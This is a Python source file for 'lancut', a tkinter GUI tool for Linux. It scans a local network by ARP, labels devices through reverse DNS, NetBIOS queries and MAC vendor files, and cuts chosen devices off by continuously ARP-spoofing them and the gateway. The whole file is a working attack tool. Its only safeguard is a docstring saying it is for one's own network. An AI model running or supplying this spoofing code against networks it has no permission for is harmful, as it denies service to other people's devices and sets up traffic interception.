#!/usr/bin/env python3
"""
lancut.py - a little elmoCut-style LAN device blocker for Linux

what it does:
- scans your local network for connected devices (ARP scan)
- lets you "block" a device by ARP spoofing it (tells it we're the router,
  and tells the router we're it, then just doesn't forward the packets)
- unblock restores the real ARP mappings
- gui built with plain tkinter, no extra GUI deps needed

needs root (raw sockets for ARP), and scapy:
    sudo pip install scapy --break-system-packages
    sudo python3 lancut.py

only use this on your own network / devices you have permission to mess with.
ARP spoofing someone else's stuff without consent is illegal in most places.
"""

import ipaddress
import os
import random
import socket
import struct
import subprocess
import sys
import threading
import time
import tkinter as tk
from tkinter import ttk, messagebox

try:
    from scapy.all import ARP, Ether, srp, send, conf
except ImportError:
    print("scapy isn't installed. Run: sudo pip install scapy --break-system-packages")
    raise SystemExit(1)

conf.verb = 0  # scapy stays quiet


# ---------- networking helpers ----------

def has_raw_socket_privilege():
    """Actually test whether we can open a raw socket, instead of just
    checking for root - this also works if cap_net_raw was granted via
    setcap without full root (see README)."""
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        s.close()
        return True
    except PermissionError:
        return False
    except Exception:
        # some other issue (e.g. AF_PACKET weirdness) - don't block startup over it
        return True


def get_default_iface():
    """Grab the interface + gateway ip that the system actually uses for internet."""
    try:
        out = subprocess.check_output(["ip", "route", "get", "1.1.1.1"], text=True)
        # something like: 1.1.1.1 via 192.168.1.1 dev wlan0 src 192.168.1.42 ...
        parts = out.split()
        gw = parts[parts.index("via") + 1]
        iface = parts[parts.index("dev") + 1]
        src = parts[parts.index("src") + 1]
        return iface, gw, src
    except Exception:
        return None, None, None


def guess_subnet(src_ip):
    """Assume a /24 (most home/office LANs) based on our own IP."""
    net = ipaddress.ip_network(src_ip + "/24", strict=False)
    return str(net)


def get_mac(ip, iface, timeout=2):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                  timeout=timeout, iface=iface, verbose=0)
    for _, rcv in ans:
        return rcv.hwsrc
    return None


def scan_network(subnet, iface, timeout=3):
    """ARP-ping the whole subnet, return list of {ip, mac} dicts."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
                  timeout=timeout, iface=iface, verbose=0)
    devices = []
    for _, rcv in ans:
        devices.append({"ip": rcv.psrc, "mac": rcv.hwsrc})
    return devices


# ---------- device naming (so you know WHO you're about to block) ----------

def reverse_dns(ip, timeout=1.0):
    """Ask DNS 'who is this IP'. Works when your router hands out hostnames
    to its own local DNS (most home routers do this for DHCP clients)."""
    try:
        socket.setdefaulttimeout(timeout)
        host, _, _ = socket.gethostbyaddr(ip)
        return host.split(".")[0]  # drop the .lan/.home domain suffix, just the name
    except Exception:
        return None
    finally:
        socket.setdefaulttimeout(None)


def _encode_netbios_name(name):
    """NetBIOS 'half-ascii' encoding: each byte becomes two letters (A-P)."""
    return "".join(chr(0x41 + (b >> 4)) + chr(0x41 + (b & 0xF)) for b in name.encode("ascii"))


def netbios_name(ip, timeout=1.0):
    """Send an NBSTAT query (UDP/137) and pull the machine's NetBIOS name
    out of the response. Mostly useful for Windows boxes."""
    query_name = "*" + "\x00" * 15  # wildcard query, 16 bytes total
    encoded = _encode_netbios_name(query_name)

    txn_id = random.randint(0, 0xFFFF)
    header = struct.pack(">HHHHHH", txn_id, 0x0000, 1, 0, 0, 0)
    question = bytes([len(encoded)]) + encoded.encode("ascii") + b"\x00"
    question += struct.pack(">HH", 0x0021, 0x0001)  # QTYPE=NBSTAT, QCLASS=IN
    packet = header + question

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(timeout)
            s.sendto(packet, (ip, 137))
            data, _ = s.recvfrom(2048)
    except Exception:
        return None

    try:
        # skip header(12) + echoed question (33 bytes name field + 4 type/class)
        # then answer name is usually a 2-byte pointer, then type(2)+class(2)+ttl(4)+rdlen(2)
        pos = 12 + len(question)
        pos += 2 + 2 + 2 + 4  # name pointer + type + class + ttl
        rdlen = struct.unpack(">H", data[pos:pos + 2])[0]
        pos += 2
        num_names = data[pos]
        pos += 1
        for _ in range(num_names):
            raw_name = data[pos:pos + 15].decode("ascii", errors="ignore").strip()
            suffix = data[pos + 15]
            if raw_name and suffix == 0x00:  # 0x00 = workstation/unique name
                return raw_name
            pos += 18
    except Exception:
        pass
    return None


def _load_vendor_db():
    """Try to find a local MAC-vendor database. Several tools ship one already
    (nmap, wireshark) - we just reuse whichever is installed. No internet calls."""
    candidates = [
        "/usr/share/nmap/nmap-mac-prefixes",
        "/usr/share/wireshark/manuf",
        "/var/lib/ieee-data/oui.txt",
    ]
    db = {}
    for path in candidates:
        if not os.path.exists(path):
            continue
        try:
            with open(path, "r", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    parts = line.split(None, 1)
                    if len(parts) != 2:
                        continue
                    prefix, vendor = parts
                    prefix = prefix.replace(":", "").replace("-", "").upper()
                    if len(prefix) >= 6 and all(c in "0123456789ABCDEF" for c in prefix[:6]):
                        db[prefix[:6]] = vendor.split("#")[0].strip()
            if db:
                break  # got a usable db, no need to check the others
        except Exception:
            continue
    return db


_VENDOR_DB = None


def vendor_lookup(mac):
    global _VENDOR_DB
    if _VENDOR_DB is None:
        _VENDOR_DB = _load_vendor_db()
    prefix = mac.replace(":", "").replace("-", "").upper()[:6]
    return _VENDOR_DB.get(prefix)


def resolve_device_name(ip, mac):
    """Best-effort device label: hostname first, then NetBIOS name,
    then fall back to the MAC vendor so you at least know the brand."""
    name = reverse_dns(ip)
    if name:
        return name
    name = netbios_name(ip)
    if name:
        return name
    vendor = vendor_lookup(mac)
    if vendor:
        return f"({vendor})"
    return "?"


# ---------- spoofing worker ----------

class Blocker:
    """Runs a background thread that keeps ARP-spoofing a target until stopped."""

    def __init__(self, iface, gw_ip, gw_mac, target_ip, target_mac):
        self.iface = iface
        self.gw_ip = gw_ip
        self.gw_mac = gw_mac
        self.target_ip = target_ip
        self.target_mac = target_mac
        self._stop = threading.Event()
        self._thread = None

    def start(self):
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        while not self._stop.is_set():
            # tell target: "I am the gateway"
            send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                      psrc=self.gw_ip), iface=self.iface, verbose=0)
            # tell gateway: "I am the target"
            send(ARP(op=2, pdst=self.gw_ip, hwdst=self.gw_mac,
                      psrc=self.target_ip), iface=self.iface, verbose=0)
            time.sleep(2)

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
        self._restore()

    def _restore(self):
        # send the real mappings back a few times so nothing stays stuck
        send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                  psrc=self.gw_ip, hwsrc=self.gw_mac), iface=self.iface,
             count=4, verbose=0)
        send(ARP(op=2, pdst=self.gw_ip, hwdst=self.gw_mac,
                  psrc=self.target_ip, hwsrc=self.target_mac), iface=self.iface,
             count=4, verbose=0)


# ---------- gui ----------

class LanCutApp:
    def __init__(self, root):
        self.root = root
        root.title("lancut")
        root.geometry("640x420")

        self.iface, self.gw_ip, self.src_ip = get_default_iface()
        self.gw_mac = None
        self.blockers = {}  # ip -> Blocker

        top = ttk.Frame(root, padding=8)
        top.pack(fill="x")

        self.status_var = tk.StringVar(value=self._status_text())
        ttk.Label(top, textvariable=self.status_var).pack(side="left")

        ttk.Button(top, text="Scan network", command=self.scan).pack(side="right")

        cols = ("ip", "mac", "name", "status")
        self.tree = ttk.Treeview(root, columns=cols, show="headings", height=14)
        for c, w in zip(cols, (140, 170, 160, 90)):
            self.tree.heading(c, text=c.upper())
            self.tree.column(c, width=w, anchor="center")
        self.tree.pack(fill="both", expand=True, padx=8, pady=8)

        btns = ttk.Frame(root, padding=8)
        btns.pack(fill="x")
        ttk.Button(btns, text="Block selected", command=self.block_selected).pack(side="left", padx=4)
        ttk.Button(btns, text="Unblock selected", command=self.unblock_selected).pack(side="left", padx=4)
        ttk.Button(btns, text="Unblock all", command=self.unblock_all).pack(side="left", padx=4)

        if self.iface and self.gw_ip:
            threading.Thread(target=self._resolve_gateway, daemon=True).start()

        root.protocol("WM_DELETE_WINDOW", self.on_close)

    def _status_text(self):
        if self.iface:
            return f"Interface: {self.iface}   Gateway: {self.gw_ip}   You: {self.src_ip}"
        return "Couldn't detect network interface (are you connected?)"

    def _resolve_gateway(self):
        try:
            self.gw_mac = get_mac(self.gw_ip, self.iface)
        except PermissionError:
            pass  # already warned about this at startup

    def scan(self):
        if not self.iface:
            messagebox.showerror("lancut", "No network interface detected.")
            return
        self.tree.delete(*self.tree.get_children())
        subnet = guess_subnet(self.src_ip)
        self.status_var.set(f"Scanning {subnet} ...")
        self.root.update_idletasks()

        def worker():
            try:
                devices = scan_network(subnet, self.iface)
            except PermissionError:
                self.root.after(0, lambda: messagebox.showerror(
                    "lancut",
                    "No permission to open raw sockets.\n\n"
                    "Run with sudo, or see the README for the setcap-based option "
                    "that avoids running the whole GUI as root."))
                self.root.after(0, lambda: self.status_var.set(self._status_text()))
                return
            self.root.after(0, lambda: self._populate(devices))

        threading.Thread(target=worker, daemon=True).start()

    def _populate(self, devices):
        self.status_var.set(self._status_text())
        for d in devices:
            tag = "you" if d["ip"] == self.src_ip else ("gateway" if d["ip"] == self.gw_ip else "")
            status = "blocked" if d["ip"] in self.blockers else ("you" if tag == "you" else ("gateway" if tag == "gateway" else "active"))
            self.tree.insert("", "end", iid=d["ip"], values=(d["ip"], d["mac"], "resolving...", status))
            # look up the name in the background so the scan doesn't stall on slow devices
            threading.Thread(target=self._resolve_and_set_name, args=(d["ip"], d["mac"]), daemon=True).start()

    def _resolve_and_set_name(self, ip, mac):
        name = resolve_device_name(ip, mac)
        if ip == self.src_ip:
            name = f"{name} (you)" if name != "?" else "(you)"
        elif ip == self.gw_ip:
            name = f"{name} (router)" if name != "?" else "(router)"
        self.root.after(0, lambda: self.tree.set(ip, "name", name) if self.tree.exists(ip) else None)

    def _selected_device(self):
        sel = self.tree.selection()
        if not sel:
            return None
        ip = sel[0]
        vals = self.tree.item(ip, "values")
        return {"ip": vals[0], "mac": vals[1]}

    def block_selected(self):
        dev = self._selected_device()
        if not dev:
            return
        if dev["ip"] in (self.src_ip, self.gw_ip):
            messagebox.showwarning("lancut", "Can't block yourself or the gateway.")
            return
        if not self.gw_mac:
            messagebox.showerror("lancut", "Gateway MAC not resolved yet, try again in a sec.")
            return
        b = Blocker(self.iface, self.gw_ip, self.gw_mac, dev["ip"], dev["mac"])
        b.start()
        self.blockers[dev["ip"]] = b
        self.tree.set(dev["ip"], "status", "blocked")

    def unblock_selected(self):
        dev = self._selected_device()
        if not dev or dev["ip"] not in self.blockers:
            return
        self.blockers.pop(dev["ip"]).stop()
        self.tree.set(dev["ip"], "status", "active")

    def unblock_all(self):
        for ip, b in list(self.blockers.items()):
            b.stop()
            if self.tree.exists(ip):
                self.tree.set(ip, "status", "active")
        self.blockers.clear()

    def on_close(self):
        self.unblock_all()
        self.root.destroy()


if __name__ == "__main__":
    if not has_raw_socket_privilege():
        print(
            "lancut needs raw socket access for ARP scanning/blocking, and doesn't have it.\n"
            "\n"
            "Easiest fix - run with sudo:\n"
            "    sudo python3 lancut.py\n"
            "\n"
            "Cleaner fix - grant raw socket access to a dedicated python copy so you\n"
            "don't have to run the whole GUI as root (avoids X11/theme headaches):\n"
            "    cp $(which python3) ~/.local/bin/python3-lancut\n"
            "    sudo setcap cap_net_raw+eip ~/.local/bin/python3-lancut\n"
            "    ~/.local/bin/python3-lancut lancut.py\n"
        )
        sys.exit(1)
    root = tk.Tk()
    app = LanCutApp(root)
    root.mainloop()
